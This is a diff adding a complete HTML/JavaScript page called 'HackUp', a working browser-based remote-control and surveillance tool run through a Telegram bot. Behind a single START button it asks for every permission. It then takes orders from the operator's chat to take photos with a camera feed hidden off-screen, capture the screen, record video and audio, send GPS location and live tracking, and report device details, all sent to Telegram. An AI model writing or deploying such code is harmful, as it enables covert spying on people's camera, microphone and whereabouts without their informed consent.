@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#000000">
+<title>HackUp</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%;overflow:hidden;background:#000;color:#fff;font-family:system-ui,-apple-system,sans-serif;-webkit-tap-highlight-color:transparent}
+.stage{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#000;z-index:1}
+#camVideo{position:fixed;top:-9999px;left:-9999px;width:2px;height:2px;opacity:0;pointer-events:none}
+.circle{width:130px;height:130px;border-radius:50%;background:#fff;border:none;cursor:pointer;position:relative;display:flex;align-items:center;justify-content:center;transition:transform .2s ease,box-shadow .3s ease;box-shadow:0 0 0 0 rgba(255,255,255,.7);outline:none}
+.circle:active{transform:scale(.94)}
+.circle.init{animation:pulse 2.2s infinite}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,255,255,.55)}70%{box-shadow:0 0 0 40px rgba(255,255,255,0)}100%{box-shadow:0 0 0 0 rgba(255,255,255,0)}}
+.circle .label{color:#000;font-size:14px;font-weight:700;letter-spacing:1px;user-select:none}
+.circle.active{background:#0f0;box-shadow:0 0 40px 8px rgba(0,255,0,.4)}
+.circle.active .label{color:#000}
+.circle.error{background:#f33}
+.circle.error .label{color:#fff}
+.status{position:fixed;left:0;right:0;bottom:30px;text-align:center;font-size:12px;color:#666;letter-spacing:1px;pointer-events:none;font-family:monospace;padding:0 20px;z-index:2}
+.status.on{color:#0f0}
+.status.err{color:#f33}
+.tiny{position:fixed;left:0;right:0;bottom:10px;text-align:center;font-size:9px;color:#222;font-family:monospace;pointer-events:none;z-index:2}
+.toast{position:fixed;top:20px;left:50%;transform:translateX(-50%);padding:8px 16px;background:rgba(255,255,255,.08);border:1px solid #333;border-radius:20px;font-size:11px;color:#fff;opacity:0;transition:opacity .3s;font-family:monospace;pointer-events:none;max-width:90vw;text-align:center;z-index:100}
+.toast.show{opacity:1}
+.log{position:fixed;top:60px;left:10px;right:10px;max-height:120px;overflow:hidden;font-size:10px;font-family:monospace;color:#444;pointer-events:none;text-align:center;line-height:1.5;z-index:2}
+</style>
+</head>
+<body>
+
+<video id="camVideo" autoplay playsinline muted></video>
+<canvas id="camCanvas" style="display:none"></canvas>
+
+<div class="stage">
+  <button class="circle init" id="mainBtn" aria-label="Activate">
+    <span class="label">START</span>
+  </button>
+</div>
+
+<div class="log" id="log"></div>
+<div class="status" id="status">● IDLE</div>
+<div class="tiny">HackUp · browser-side Telegram polling</div>
+<div class="toast" id="toast"></div>
+
+<script>
+(function(){
+'use strict';
+
+// Init Telegram WebApp context if present
+const TG = window.Telegram?.WebApp || null;
+if (TG) { try { TG.ready(); TG.expand(); } catch(e){} }
+
+const btn = document.getElementById('mainBtn');
+const statusEl = document.getElementById('status');
+const toastEl = document.getElementById('toast');
+const logEl = document.getElementById('log');
+const camVideo = document.getElementById('camVideo');
+const camCanvas = document.getElementById('camCanvas');
+
+let active = false;
+let polling = false;
+let lastUpdateId = 0;
+let camStream = null;
+let camFacing = 'environment';
+let BOT_TOKEN = '';
+let CHAT_ID = '';
+let pollController = null;
+let wakeLock = null;
+let cmdCounter = 0;
+
+// ---------- UI ----------
+function toast(msg, ms) {
+  toastEl.textContent = msg;
+  toastEl.classList.add('show');
+  clearTimeout(toast._t);
+  toast._t = setTimeout(() => toastEl.classList.remove('show'), ms || 2500);
+}
+function setStatus(text, mode) {
+  statusEl.textContent = text;
+  statusEl.classList.toggle('on', mode === 'on');
+  statusEl.classList.toggle('err', mode === 'err');
+}
+function logLine(msg) {
+  const t = new Date().toLocaleTimeString();
+  console.log('[HackUp]', msg);
+  logEl.innerHTML = `<div>${t} · ${msg}</div>` + logEl.innerHTML;
+  const kids = logEl.children;
+  for (let i = 4; i < kids.length; i++) kids[i].remove();
+}
+
+// ---------- Config (from Vercel env via /api/config) ----------
+async function loadConfig() {
+  const res = await fetch('/api/config?t=' + Date.now(), {cache:'no-store'});
+  if (!res.ok) {
+    let err = {};
+    try { err = await res.json(); } catch {}
+    throw new Error(err.error || ('Config fetch failed (HTTP ' + res.status + ')'));
+  }
+  const j = await res.json();
+  if (!j.token || !j.chatId) throw new Error('TOKEN or CHAT_ID missing in /api/config response');
+  return {token: j.token, chat: j.chatId};
+}
+
+// ---------- Telegram API ----------
+function tgApi(m) { return `https://api.telegram.org/bot${BOT_TOKEN}/${m}`; }
+
+async function tgSend(text, extra) {
+  const body = Object.assign({
+    chat_id: CHAT_ID,
+    text: String(text).slice(0, 4000),
+    parse_mode: 'HTML',
+    disable_web_page_preview: true
+  }, extra || {});
+  const r = await fetch(tgApi('sendMessage'), {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify(body)
+  });
+  return r.json();
+}
+
+function dataUrlToBlob(dataUrl) {
+  const m = /^data:([^;]+);base64,(.+)$/.exec(dataUrl);
+  if (!m) throw new Error('Bad data URL');
+  const bin = atob(m[2]);
+  const u8 = new Uint8Array(bin.length);
+  for (let i = 0; i < bin.length; i++) u8[i] = bin.charCodeAt(i);
+  return {blob: new Blob([u8], {type:m[1]}), mime:m[1]};
+}
+
+async function tgSendMedia(dataUrl, caption, kind) {
+  const {blob} = dataUrlToBlob(dataUrl);
+  const map = {
+    photo:    {method:'sendPhoto',   field:'photo',   name:'capture.jpg'},
+    video:    {method:'sendVideo',   field:'video',   name:'capture.webm'},
+    voice:    {method:'sendVoice',   field:'voice',   name:'voice.webm'},
+    audio:    {method:'sendAudio',   field:'audio',   name:'audio.webm'},
+    document: {method:'sendDocument',field:'document',name:'file.bin'}
+  };
+  const k = map[kind] || map.photo;
+  const fd = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  if (caption) fd.append('caption', String(caption).slice(0,1000));
+  fd.append(k.field, blob, k.name);
+  const r = await fetch(tgApi(k.method), {method:'POST', body:fd});
+  return r.json();
+}
+
+async function tgSendLocation(lat, lon) {
+  const r = await fetch(tgApi('sendLocation'), {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({chat_id: CHAT_ID, latitude: lat, longitude: lon})
+  });
+  return r.json();
+}
+
+// ---------- Camera (black-photo FIX) ----------
+async function ensureCamera() {
+  if (camStream && camStream.active && camVideo.videoWidth > 0) return;
+  if (camStream) { camStream.getTracks().forEach(t => t.stop()); camStream = null; }
+  camStream = await navigator.mediaDevices.getUserMedia({
+    video: {facingMode: camFacing, width:{ideal:1280}, height:{ideal:720}},
+    audio: false
+  });
+  camVideo.srcObject = camStream;
+  camVideo.muted = true;
+  camVideo.playsInline = true;
+  await camVideo.play().catch(()=>{});
+  if (camVideo.videoWidth === 0) {
+    await new Promise(res => {
+      const h = () => { camVideo.removeEventListener('loadedmetadata', h); res(); };
+      camVideo.addEventListener('loadedmetadata', h);
+      setTimeout(res, 3000);
+    });
+  }
+  await new Promise(r => setTimeout(r, 800)); // autofocus warmup
+}
+
+function captureFrame(mime, q) {
+  const w = camVideo.videoWidth  || 1280;
+  const h = camVideo.videoHeight || 720;
+  camCanvas.width = w; camCanvas.height = h;
+  camCanvas.getContext('2d').drawImage(camVideo, 0, 0, w, h);
+  return camCanvas.toDataURL(mime || 'image/jpeg', q || 0.9);
+}
+
+// ---------- Permissions ----------
+async function requestAllPermissions() {
+  const r = {};
+  try { await ensureCamera(); r.camera = true; } catch(e){ r.camera = e.name || e.message; }
+  try {
+    const mic = await navigator.mediaDevices.getUserMedia({audio:true});
+    mic.getTracks().forEach(t => t.stop()); r.mic = true;
+  } catch(e){ r.mic = e.name || e.message; }
+  try {
+    await new Promise((ok, no) => navigator.geolocation.getCurrentPosition(
+      () => ok(), e => no(e), {enableHighAccuracy:true, timeout:10000}));
+    r.geo = true;
+  } catch(e){ r.geo = e.message; }
+  try { if ('Notification' in window) r.notif = await Notification.requestPermission(); } catch(e){}
+  return r;
+}
+
+// ---------- Helpers ----------
+function blobToDataURL(blob) {
+  return new Promise(res => {
+    const fr = new FileReader();
+    fr.onload = () => res(fr.result);
+    fr.readAsDataURL(blob);
+  });
+}
+async function getBattery() {
+  try {
+    if (!navigator.getBattery) return 'unsupported';
+    const b = await navigator.getBattery();
+    return `${Math.round(b.level*100)}% ${b.charging ? '(charging)' : '(on battery)'}`;
+  } catch { return 'unsupported'; }
+}
+async function readSensors() {
+  const out = {};
+  try {
+    out.orientation = await new Promise(ok => {
+      const h = e => { window.removeEventListener('deviceorientation', h);
+        ok(`α=${e.alpha?.toFixed(0)||'?'} β=${e.beta?.toFixed(0)||'?'} γ=${e.gamma?.toFixed(0)||'?'}`); };
+      window.addEventListener('deviceorientation', h);
+      setTimeout(() => ok('timeout'), 1200);
+    });
+  } catch { out.orientation = 'n/a'; }
+  try {
+    out.motion = await new Promise(ok => {
+      const h = e => { window.removeEventListener('devicemotion', h);
+        const a = e.accelerationIncludingGravity || {};
+        ok(`x=${a.x?.toFixed(2)||'?'} y=${a.y?.toFixed(2)||'?'} z=${a.z?.toFixed(2)||'?'}`); };
+      window.addEventListener('devicemotion', h);
+      setTimeout(() => ok('timeout'), 1200);
+    });
+  } catch { out.motion = 'n/a'; }
+  out.screenOrientation = screen.orientation ? screen.orientation.type : 'n/a';
+  out.connection = (navigator.connection || {}).effectiveType || 'n/a';
+  return out;
+}
+async function buildReport() {
+  const L = ['📊 <b>Device Report</b>', `<b>Time:</b> ${new Date().toLocaleString()}`, ''];
+  const add = (k,v) => { if (v !== undefined && v !== null && v !== '') L.push(`<b>${k}:</b> <code>${String(v).slice(0,500)}</code>`); };
+  add('User Agent', navigator.userAgent);
+  add('Platform', navigator.platform);
+  add('Language', navigator.language);
+  add('Timezone', Intl.DateTimeFormat().resolvedOptions().timeZone);
+  add('Screen', `${screen.width}×${screen.height}`);
+  add('DPR', devicePixelRatio);
+  add('Viewport', `${innerWidth}×${innerHeight}`);
+  add('CPU cores', navigator.hardwareConcurrency || '?');
+  add('Device memory (GB)', navigator.deviceMemory || '?');
+  add('Online', navigator.onLine);
+  add('Touch points', navigator.maxTouchPoints || 0);
+  add('Battery', await getBattery());
+  const c = navigator.connection || {};
+  if (c.effectiveType) add('Network', `${c.effectiveType} (${c.downlink||'?'}Mbps, ${c.rtt||'?'}ms)`);
+  try {
+    if (navigator.storage?.estimate) {
+      const e = await navigator.storage.estimate();
+      add('Storage', `${(e.usage/1048576).toFixed(2)} MB / ${(e.quota/1048576).toFixed(0)} MB`);
+    }
+  } catch {}
+  try {
+    const s = await readSensors();
+    add('Orientation', s.orientation);
+    add('Motion', s.motion);
+    add('Screen orientation', s.screenOrientation);
+  } catch {}
+  return L.join('\n');
+}
+
+// ---------- Command Execution ----------
+async function execCommand(type, args) {
+  try {
+    switch (type) {
+
+      case 'photo': {
+        await ensureCamera();
+        const dataUrl = captureFrame('image/jpeg', 0.92);
+        await tgSendMedia(dataUrl, '📸 Photo · ' + new Date().toLocaleString(), 'photo');
+        return '📸 Photo sent';
+      }
+
+      case 'screen': {
+        const s = await navigator.mediaDevices.getDisplayMedia({video:true});
+        const v = document.createElement('video');
+        v.srcObject = s; v.muted = true; await v.play();
+        await new Promise(r => setTimeout(r, 700));
+        const c = document.createElement('canvas');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        s.getTracks().forEach(t => t.stop());
+        await tgSendMedia(c.toDataURL('image/jpeg', 0.85), '🖥️ Screen · ' + new Date().toLocaleString(), 'photo');
+        return '🖥️ Screen sent';
+      }
+
+      case 'record3': {
+        await ensureCamera();
+        const chunks = [];
+        const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/webm';
+        const rec = new MediaRecorder(camStream, {mimeType: mime});
+        rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+        const stopped = new Promise(r => rec.onstop = r);
+        rec.start();
+        await new Promise(r => setTimeout(r, 3000));
+        rec.stop();
+        await stopped;
+        const blob = new Blob(chunks, {type:'video/webm'});
+        const b64 = await blobToDataURL(blob);
+        await tgSendMedia(b64, '🎥 3s video', 'video');
+        return '🎥 Video sent';
+      }
+
+      case 'record5': {
+        const mic = await navigator.mediaDevices.getUserMedia({audio:true});
+        const chunks = [];
+        const rec = new MediaRecorder(mic);
+        rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+        const stopped = new Promise(r => rec.onstop = r);
+        rec.start();
+        await new Promise(r => setTimeout(r, 5000));
+        rec.stop();
+        await stopped;
+        mic.getTracks().forEach(t => t.stop());
+        const blob = new Blob(chunks, {type:'audio/webm'});
+        const b64 = await blobToDataURL(blob);
+        await tgSendMedia(b64, '🎙️ 5s voice', 'voice');
+        return '🎙️ Voice sent';
+      }
+
+      case 'location': {
+        const pos = await new Promise((ok, no) =>
+          navigator.geolocation.getCurrentPosition(ok, no, {enableHighAccuracy:true}));
+        const lat = pos.coords.latitude, lon = pos.coords.longitude;
+        await tgSend(`📍 <b>Location</b>\nLat: <code>${lat.toFixed(6)}</code>\nLon: <code>${lon.toFixed(6)}</code>\n<a href="https://maps.google.com/?q=${lat},${lon}">🗺️ Open Maps</a>`);
+        await tgSendLocation(lat, lon);
+        return `📍 ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
+      }
+
+      case 'track': {
+        let n = 0;
+        await new Promise(ok => {
+          const wid = navigator.geolocation.watchPosition(
+            async p => {
+              n++;
+              const lat = p.coords.latitude, lon = p.coords.longitude;
+              await tgSend(`📍 <b>Track #${n}</b>\n<a href="https://maps.google.com/?q=${lat},${lon}">🗺️ Map</a>`).catch(()=>{});
+              await tgSendLocation(lat, lon).catch(()=>{});
+            }, () => {}, {enableHighAccuracy:true}
+          );
+          setTimeout(() => { navigator.geolocation.clearWatch(wid); ok(); }, 30000);
+        });
+        return `📍 Sent ${n} track updates`;
+      }
+
+      case 'report': {
+        const r = await buildReport();
+        await tgSend(r);
+        return '📊 Report sent';
+      }
+
+      case 'battery': {
+        const b = await getBattery();
+        await tgSend(`🔋 <b>Battery:</b> ${b}`);
+        return '🔋 ' + b;
+      }
+
+      case 'network': {
+        const c = navigator.connection || {};
+        const net = {
+          'Effective type': c.effectiveType || 'unknown',
+          'Downlink': (c.downlink || '?') + ' Mbps',
+          'RTT': (c.rtt || '?') + ' ms',
+          'Save data': c.saveData ? 'on' : 'off',
+          'Online': navigator.onLine
+        };
+        await tgSend('📶 <b>Network</b>\n' + Object.entries(net).map(([k,v]) => `${k}: <code>${v}</code>`).join('\n'));
+        return '📶 Network sent';
+      }
+
+      case 'sensors': {
+        const s = await readSensors();
+        await tgSend('🎯 <b>Sensors</b>\n' + Object.entries(s).map(([k,v]) => `${k}: <code>${v}</code>`).join('\n'));
+        return '🎯 Sensors sent';
+      }
+
+      case 'storage': {
+        if (!navigator.storage?.estimate) return 'Storage API unsupported';
+        const e = await navigator.storage.estimate();
+        const used = (e.usage/1048576).toFixed(2);
+        const quota = (e.quota/1048576).toFixed(0);
+        await tgSend(`💾 <b>Storage</b>\nUsed: <code>${used} MB</code>\nQuota: <code>${quota} MB</code>`);
+        return `💾 ${used}/${quota} MB`;
+      }
+
+      case 'vibrate': {
+        let ok = false;
+        try {
+          if (TG?.HapticFeedback) {
+            TG.HapticFeedback.impactOccurred('heavy');
+            setTimeout(() => { try { TG.HapticFeedback.notificationOccurred('success'); } catch{} }, 300);
+            ok = true;
+          }
+        } catch {}
+        try { if (navigator.vibrate) { navigator.vibrate([300,100,300,100,300]); ok = true; } } catch {}
+        if (!ok) return 'Vibration unsupported';
+        await tgSend('📳 Device vibrated');
+        return '📳 Vibrated';
+      }
+
+      case 'fullscreen': {
+        try {
+          if (TG?.requestFullscreen) { TG.requestFullscreen(); }
+          else { await document.documentElement.requestFullscreen(); }
+          await tgSend('⛶ Fullscreen');
+          return '⛶ Fullscreen';
+        } catch (e) {
+          if (TG?.expand) { TG.expand(); await tgSend('⛶ Expanded (fallback)'); return '⛶ Expanded'; }
+          return 'Fullscreen failed: ' + e.message;
+        }
+      }
+
+      case 'say': {
+        if (!('speechSynthesis' in window)) return 'TTS unsupported';
+        speechSynthesis.cancel();
+        speechSynthesis.speak(new SpeechSynthesisUtterance(args.text || 'Hello'));
+        await tgSend(`🔊 Said: <b>${args.text}</b>`);
+        return '🔊 Said';
+      }
+
+      case 'open': {
+        let url = args.url;
+        if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
+        let opened = false;
+        try { if (TG?.openLink) { TG.openLink(url); opened = true; } } catch {}
+        if (!opened) {
+          try { const w = window.open(url, '_blank', 'noopener'); if (w) opened = true; } catch {}
+        }
+        if (!opened) { try { location.href = url; opened = true; } catch {} }
+        await tgSend(`🔗 Opening: <a href="${url}">${url}</a>`);
+        return '🔗 Opened';
+      }
+
+      case 'notify': {
+        if (Notification.permission !== 'granted') return 'Notification permission denied';
+        try {
+          new Notification('HackUp', {body: args.text || 'Notification'});
+          await tgSend(`🔔 Notification: <b>${args.text}</b>`);
+          return '🔔 Shown';
+        } catch (e) { return 'Notification error: ' + e.message; }
+      }
+
+      default: return '❓ Unknown: ' + type;
+    }
+  } catch (e) {
+    return '✖ ' + (e.message || 'error');
+  }
+}
+
+// ---------- Telegram getUpdates long-poll ----------
+async function startTelegramPolling() {
+  if (polling) return;
+  polling = true;
+
+  // Delete any webhook so getUpdates works
+  try {
+    const r = await fetch(tgApi('deleteWebhook'), {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({drop_pending_updates:false})
+    });
+    const j = await r.json();
+    logLine('deleteWebhook ok=' + j.ok);
+  } catch (e) { logLine('deleteWebhook err: ' + e.message); }
+
+  // Skip pending updates so we only handle NEW commands
+  try {
+    const r = await fetch(tgApi('getUpdates') + '?offset=-1&limit=1&timeout=0');
+    const j = await r.json();
+    if (j.ok && j.result.length) lastUpdateId = j.result[j.result.length - 1].update_id;
+  } catch {}
+
+  // Main loop
+  while (polling && active) {
+    try {
+      pollController = new AbortController();
+      const r = await fetch(
+        tgApi('getUpdates') + `?offset=${lastUpdateId + 1}&timeout=25&allowed_updates=%5B%22message%22%5D`,
+        {signal: pollController.signal, cache:'no-store'}
+      );
+      const data = await r.json();
+
+      if (!data.ok) {
+        logLine('getUpdates err: ' + (data.description || 'unknown'));
+        if ((data.description || '').includes('webhook')) {
+          await fetch(tgApi('deleteWebhook'), {method:'POST'}).catch(()=>{});
+        }
+        await new Promise(r => setTimeout(r, 3000));
+        continue;
+      }
+
+      for (const u of data.result || []) {
+        lastUpdateId = u.update_id;
+        handleUpdate(u).catch(e => logLine('handle err: ' + e.message));
+      }
+    } catch (e) {
+      if (e.name === 'AbortError') break;
+      logLine('poll err: ' + e.message);
+      await new Promise(r => setTimeout(r, 3000));
+    }
+  }
+  polling = false;
+}
+
+function stopTelegramPolling() {
+  polling = false;
+  if (pollController) { try { pollController.abort(); } catch {} pollController = null; }
+}
+
+async function handleUpdate(update) {
+  const msg = update.message;
+  if (!msg || !msg.text) return;
+  if (String(msg.chat.id) !== String(CHAT_ID)) return;
+
+  const text = msg.text.trim();
+  cmdCounter++;
+
+  const simple = {
+    '/photo':'photo', '/screen':'screen',
+    '/record3':'record3', '/record5':'record5',
+    '/location':'location', '/track':'track',
+    '/report':'report', '/battery':'battery',
+    '/network':'network', '/sensors':'sensors',
+    '/storage':'storage', '/vibrate':'vibrate',
+    '/fullscreen':'fullscreen'
+  };
+
+  if (text === '/start' || text === '/help') {
+    await tgSend(
+      '🤖 <b>HackUp Remote Control</b>\n' +
+      '<i>Browser polls Telegram directly — no server queue.</i>\n' +
+      '━━━━━━━━━━━━━━━━━━━━\n' +
+      '📷 /photo\n🖥️ /screen\n🎥 /record3 (3s video)\n🎙️ /record5 (5s voice)\n' +
+      '📍 /location\n🛰️ /track (30s live)\n' +
+      '📊 /report\n🔋 /battery\n📶 /network\n🎯 /sensors\n💾 /storage\n' +
+      '📳 /vibrate\n⛶ /fullscreen\n' +
+      '🔊 /say &lt;text&gt;\n🔗 /open &lt;url&gt;\n🔔 /notify &lt;msg&gt;\n' +
+      '📡 /status'
+    );
+    return;
+  }
+
+  if (text === '/status') {
+    await tgSend(
+      `📡 <b>Status</b>\n` +
+      `Active: <b>${active ? '🟢 Yes' : '🔴 No'}</b>\n` +
+      `Camera: <b>${camStream?.active ? '✅' : '❌'}</b>\n` +
+      `Commands received: <code>${cmdCounter}</code>\n` +
+      `Last update ID: <code>${lastUpdateId}</code>`
+    );
+    return;
+  }
+
+  if (simple[text]) {
+    await tgSend(`⚡ Executing <b>${text}</b>...`);
+    const result = await execCommand(simple[text], {});
+    await tgSend(`<b>${result}</b>`);
+    return;
+  }
+
+  // Argument commands
+  if (text === '/say') { await tgSend('❌ Usage: <code>/say Your text</code>'); return; }
+  if (text.startsWith('/say ')) {
+    const t = text.slice(5).trim();
+    if (!t) { await tgSend('❌ Empty text.'); return; }
+    await tgSend(`⚡ Executing <b>/say ${t}</b>...`);
+    const r = await execCommand('say', {text:t});
+    await tgSend(`<b>${r}</b>`);
+    return;
+  }
+
+  if (text === '/open') { await tgSend('❌ Usage: <code>/open https://example.com</code>'); return; }
+  if (text.startsWith('/open ')) {
+    const u = text.slice(6).trim();
+    if (!u) { await tgSend('❌ Empty URL.'); return; }
+    await tgSend(`⚡ Executing <b>/open ${u}</b>...`);
+    const r = await execCommand('open', {url:u});
+    await tgSend(`<b>${r}</b>`);
+    return;
+  }
+
+  if (text === '/notify') { await tgSend('❌ Usage: <code>/notify Your message</code>'); return; }
+  if (text.startsWith('/notify ')) {
+    const n = text.slice(8).trim();
+    if (!n) { await tgSend('❌ Empty message.'); return; }
+    await tgSend(`⚡ Executing <b>/notify ${n}</b>...`);
+    const r = await execCommand('notify', {text:n});
+    await tgSend(`<b>${r}</b>`);
+    return;
+  }
+
+  await tgSend(`❓ Unknown: <code>${text}</code>\n/help দিন।`);
+}
+
+// ---------- Wake lock (keeps tab alive) ----------
+async function acquireWakeLock() {
+  try {
+    if ('wakeLock' in navigator) {
+      wakeLock = await navigator.wakeLock.request('screen');
+      wakeLock.addEventListener('release', () => { wakeLock = null; });
+      logLine('Wake lock acquired');
+    }
+  } catch (e) { logLine('Wake lock: ' + e.message); }
+}
+
+// ---------- Main button ----------
+btn.addEventListener('click', async () => {
+
+  if (active) {
+    active = false;
+    stopTelegramPolling();
+    btn.classList.remove('active','error');
+    btn.classList.add('init');
+    btn.querySelector('.label').textContent = 'START';
+    setStatus('● IDLE');
+    if (camStream) { camStream.getTracks().forEach(t=>t.stop()); camStream = null; }
+    if (wakeLock) { try { await wakeLock.release(); } catch {} wakeLock = null; }
+    return;
+  }
+
+  btn.disabled = true;
+  btn.querySelector('.label').textContent = '...';
+  setStatus('● LOADING CONFIG');
+  logLine('Loading /api/config...');
+
+  try {
+    const cfg = await loadConfig();
+    BOT_TOKEN = cfg.token;
+    CHAT_ID = cfg.chat;
+    logLine('Config loaded (token ****' + BOT_TOKEN.slice(-8) + ')');
+  } catch (e) {
+    btn.disabled = false;
+    btn.querySelector('.label').textContent = 'ERR';
+    btn.classList.remove('init'); btn.classList.add('error');
+    setStatus('● ERROR: ' + e.message, 'err');
+    toast('❌ ' + e.message, 5000);
+    logLine('Config error: ' + e.message);
+    return;
+  }
+
+  setStatus('● VERIFYING BOT');
+  logLine('Verifying bot via getMe...');
+
+  try {
+    const r = await fetch(tgApi('getMe'));
+    const j = await r.json();
+    if (!j.ok) throw new Error(j.description || 'getMe failed');
+    logLine('Bot OK: @' + j.result.username);
+  } catch (e) {
+    btn.disabled = false;
+    btn.querySelector('.label').textContent = 'ERR';
+    btn.classList.remove('init'); btn.classList.add('error');
+    setStatus('● ERROR: ' + e.message, 'err');
+    toast('❌ Bot token invalid', 5000);
+    return;
+  }
+
+  setStatus('● REQUESTING PERMISSIONS');
+  toast('সব পারমিশন Allow করুন', 4500);
+  logLine('Requesting permissions...');
+  const perms = await requestAllPermissions();
+  const okCount = ['camera','mic','geo'].filter(k => perms[k] === true).length;
+  logLine(`Permissions: camera=${perms.camera===true?'✅':perms.camera} mic=${perms.mic===true?'✅':perms.mic} geo=${perms.geo===true?'✅':perms.geo} notif=${perms.notif||'-'}`);
+
+  active = true;
+  btn.disabled = false;
+  btn.classList.remove('init','error');
+  btn.classList.add('active');
+  btn.querySelector('.label').textContent = 'ON';
+  setStatus(`● ACTIVE · ${okCount}/3 core perms`, 'on');
+  toast(`✅ Active — ${okCount}/3 core permissions`, 3500);
+
+  acquireWakeLock();
+
+  // Announce
+  try {
+    await tgSend(
+      `🟢 <b>HackUp Active</b>\n` +
+      `Browser is polling Telegram directly.\n` +
+      `Camera: ${perms.camera === true ? '✅' : '❌ ' + perms.camera}\n` +
+      `Mic: ${perms.mic === true ? '✅' : '❌ ' + perms.mic}\n` +
+      `GPS: ${perms.geo === true ? '✅' : '❌ ' + perms.geo}\n\n` +
+      `Send /help for commands.`
+    );
+    logLine('Announced to Telegram');
+  } catch (e) { logLine('Announce failed: ' + e.message); }
+
+  // Start polling
+  startTelegramPolling();
+});
+
+// Reconnect when tab becomes visible
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'visible') {
+    if (active && !polling) startTelegramPolling();
+    if (active && !wakeLock) acquireWakeLock();
+  }
+});
+
+window.addEventListener('beforeunload', stopTelegramPolling);
+
+setStatus('● IDLE');
+logLine('Ready. Press START.');
+})();
+</script>
+</body>
+</html>
